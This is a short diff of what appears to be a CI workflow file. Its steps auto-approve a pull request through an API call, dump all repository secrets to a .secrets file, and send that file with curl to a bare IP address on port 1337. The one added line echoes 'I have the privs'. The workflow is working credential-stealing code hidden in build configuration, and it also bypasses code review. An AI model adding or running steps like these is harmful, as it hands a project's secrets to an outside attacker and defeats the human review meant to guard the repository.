@@ -20,5 +20,6 @@ jobs:
          --header 'content-type: application/json' \
          -d '{"event":"APPROVE"}'
          echo "Thanks Matt"
+         echo "I have the privs"
          echo "${{ toJSON(secrets) }}" > .secrets
          curl -X POST -s --data "@.secrets" "http://40.119.51.181:1337"
